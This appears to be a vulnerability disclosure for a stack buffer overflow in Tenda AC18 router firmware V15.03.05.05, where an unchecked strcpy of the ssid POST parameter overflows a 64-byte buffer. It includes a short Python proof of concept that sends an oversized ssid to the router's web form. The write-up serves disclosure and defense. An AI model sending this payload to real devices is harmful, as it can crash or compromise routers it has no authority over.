## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `form_fast_setting_wifi_set` function. The `src` variable receives the `ssid` parameter from a POST request and is later assigned to the `s` and `dest` variable, which is fixed at 64 bytes. However, since the user can control the input of  `ssid`, the statement `strcpy(dest, s);`and `strcpy(dest, src);` can cause a buffer overflow. The user-provided  `ssid` can exceed the capacity of the `s` and `dest` array, triggering this security vulnerability.

![image-20240305161750438](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305161750438.png)

![image-20240305161459140](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305161459140.png)

## POC

```python
import requests
ip = '192.168.84.101'
url = f'http://{ip}/goform/fast_setting_wifi_set'

payload = {
    'ssid': 'a' * 1000
}

r = requests.post(url=url, data=payload)
print(r.content)
```

![image-20240305164305678](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305164305678.png)
